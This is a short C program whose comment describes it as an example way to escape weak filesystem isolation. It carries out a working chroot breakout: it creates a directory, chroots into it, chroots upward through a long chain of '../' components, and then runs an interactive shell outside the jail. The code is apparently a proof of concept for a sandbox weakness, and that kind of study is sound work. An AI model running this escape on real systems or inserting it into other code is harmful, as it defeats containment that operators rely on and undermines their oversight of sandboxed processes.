#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>

// Example way to escape the current weak FS isolation

int main() {
	mkdir("escape", 07555);
	chroot("escape");
	chroot("../../../../../../../../../../../../../../../../");
	execl("/bin/sh", "-i", NULL);
	perror("execl failed");
	return 1;
}


